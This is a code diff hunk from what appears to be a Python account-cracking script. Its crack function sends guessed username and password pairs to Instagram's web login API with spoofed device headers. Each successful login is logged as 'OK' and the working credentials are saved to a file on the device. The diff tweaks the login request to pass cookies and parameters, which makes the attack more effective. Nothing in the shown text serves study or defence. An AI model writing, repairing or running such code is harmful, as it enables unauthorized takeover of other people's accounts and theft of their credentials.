@@ -178,7 +178,7 @@ def crack(uid, pww, total_idz):
                 'x-requested-with': 'XMLHttpRequest',
                 'x-web-device-id': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',}
             login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url, data=data, headers=headers)
+            response = requests.post(login_url, params=params, cookies=cookies, headers=headers, data=data)
             if response.status_code == 200 and response.json().get("authenticated"):
                 print(f"\r\033[1;92m [XYZ-OK] {uid} | {pw}")
                 open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
